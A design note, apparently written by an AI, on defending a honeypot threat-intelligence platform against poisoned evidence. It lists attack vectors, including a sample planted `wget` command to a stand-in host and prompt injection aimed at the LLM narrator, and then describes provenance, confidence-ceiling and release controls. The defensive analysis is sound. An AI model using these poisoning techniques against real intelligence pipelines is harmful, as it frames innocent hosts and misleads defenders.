# Poisoned evidence — Claude's independent answer (2026-08-04)

Written before reading ChatGPT's response.

## The uncomfortable core of the problem

**Our most valuable findings are our least corroborated ones.** A
sector-exclusive actor that no reputation feed classifies is simultaneously
our best product and the easiest thing in the world to fabricate. Any
mitigation that simply says "require corroboration" destroys the thing that
makes this platform worth running.

So the goal is not to eliminate poisoning risk. It is to **know which
findings are cheap to fake and refuse to let those ones travel.**

## Vectors, specific to what we built

| # | Vector | What it attacks |
|---|---|---|
| 1 | **Planted C2 / third-party URLs** — `wget http://innocent-victim.example/x` | Gets an innocent host published as attacker infrastructure. **Highest-impact, zero-cost.** |
| 2 | **Fake attribution strings** — actor names, foreign-language comments, distinctive "signatures" in commands | Causes false attribution in our prose and partner reports |
| 3 | **TTP mimicry** — replaying another actor's known command sequence | Poisons our command clustering *and* any downstream attribution |
| 4 | **Sector-targeting spoofing** — fingerprint our sensors, then deliberately hit only the medtech one | Manufactures a fake "targeted campaign" — attacks our single biggest differentiator |
| 5 | **Novelty gaming** — rotate IPs within a /24 so everything looks first-seen | Inflates our novelty scoring and the reputation-blind queue |
| 6 | **Volume manipulation** — flood from a benign/shared IP | Gets a NAT gateway, VPN exit or university listed as a top attacker |
| 7 | **Cluster splitting** — insert one random command per session | Defeats exact-fingerprint clustering; real campaigns fragment into "novel" noise |
| 8 | **ATT&CK bait** — run commands chosen to trigger specific technique mappings | Inflates severity, produces a scary-looking but hollow report |
| 9 | **Prompt injection in payloads** | Targets the LLM narrator directly |
| 10 | **Decoy malware** — upload benign or well-known files with alarming names | Wastes analysis, pollutes malware findings |

## What is actually achievable with the data we hold

**1. Provenance separation — the single most important control.**
Every fact is either:
- **OBSERVED** — we saw the packets. A session happened; this IP connected;
  this command was typed at our sensor; this file was uploaded.
- **ASSERTED** — attacker-controlled text *claimed* it. A URL inside a
  command, a hostname in a script, a filename, an actor name in a comment.

A URL in a command is a **claim, not an observation**. We never saw that host
do anything. Publishing it as infrastructure is exactly how vector 1 works.
**Implemented:** the registry has separate `evidence` and `asserted` columns;
only `evidence` may support high confidence or external release.

**2. Forgery-cost weighting.** Confidence is capped by how expensive the
behaviour would be to fake, not by how alarming it looks:

| Finding type | Cost to fake | Confidence ceiling |
|---|---|---|
| ASN campaign (many hosts, sustained, one provider) | high | 90 |
| Command cluster (repeated real sessions) | medium | 70 |
| Reputation-blind actor | medium | 70 |
| Credential pattern | low | 45 |
| Asserted infrastructure (a URL typed at us) | trivial | 20 |

**Implemented** as `FORGERY_COST` / `CONFIDENCE_CEILING` in `findings.py`.

**3. Persistence as the strongest anti-poisoning signal.** Faking one day is
free. Faking 14 consecutive days across many hosts costs real money and
real infrastructure. The priority model already weights `days_seen`, and
external release should require multi-day persistence. **This is why the
findings registry is itself an anti-poisoning control** — not just a
reporting convenience.

**4. Subnet/ASN-level novelty, not IP-level.** Defeats vector 5. If 24 "new"
IPs share a /21 and an ASN, that is one actor rotating, not 24 discoveries.
Our ASN campaign detection already groups this way; novelty scoring should
inherit it.

**5. Fuzzy clustering.** Exact fingerprint matching (what we have) is
brittle against vector 7. Similarity-based clustering — the 5080 already has
`nomic-embed-text` pulled — would resist single-command padding.

**6. Shared-infrastructure guard.** Before any IP is published, check whether
it looks like a NAT gateway, VPN exit, cloud egress or university range.
High unique-session-count with low behavioural coherence is the tell.

**7. Honeypot-awareness flag.** Did the session probe for honeypot indicators
before acting? If the attacker knew, treat everything afterwards as
potentially staged for our benefit.

## Structurally forbidden, regardless of how convincing it looks

1. **Attribution derived from attacker-controlled text.** Actor names,
   language, and "signatures" found in commands can never originate a claim.
   Free to fake, permanently damaging when wrong.
2. **Publishing asserted infrastructure as observed.** A URL in a command may
   be reported as "referenced in observed commands" — never as "C2".
3. **Single-observation external release.** Nothing leaves on one day's data.
4. **LLM-originated facts.** Already enforced; it matters doubly here since
   injected text targets the narrator.
5. **Naming the enrichment vendors in reports** (operator instruction).
   Say "commercial reputation source", not the product name. This also
   denies an adversary knowledge of which feeds we can and cannot see with.

## Registry and confidence representation

Implemented now:
- `evidence` vs `asserted` — provenance split
- `forgery_cost` + confidence ceiling per finding type
- `days_seen` — persistence, weighted in priority
- `external_ok`, `reviewed_by`, `reviewed_at` — nothing ships unreviewed

Still to add:
- `corroboration`: `honeypot_only` | `multi_sensor` | `external_confirmed`
- `poisoning_flags`: shared-infrastructure suspicion, honeypot-awareness,
  attribution-string present, novelty-gaming suspicion
- Separate **observation confidence** (did we see it — usually high) from
  **analytic confidence** (does our interpretation hold — often low)

## Internal briefs vs data leaving the building

**Internal:** show everything, clearly labelled. Asserted content is useful to
an analyst who knows what it is. Low-confidence findings are still leads.

**External (partners / OpenCTI / OTX) — much stricter:**

| Gate | Requirement |
|---|---|
| Persistence | seen on ≥3 distinct days |
| Provenance | OBSERVED evidence only; asserted content stripped or explicitly caveated |
| Confidence | above the forgery-cost ceiling for its type |
| Disposition | human-reviewed `true_positive` |
| Attribution | none, unless externally corroborated |
| Third-party protection | shared-infrastructure check passed |
| Framing | "observed against honeypot sensors" — never "confirmed malicious" |
| Vendors | never named |

The honest framing for everything we publish: *we observed this behaviour
against decoy infrastructure.* Not *this actor is malicious*. That single
sentence prevents most of the harm poisoning could cause, because it makes
the epistemic limits explicit to the recipient.
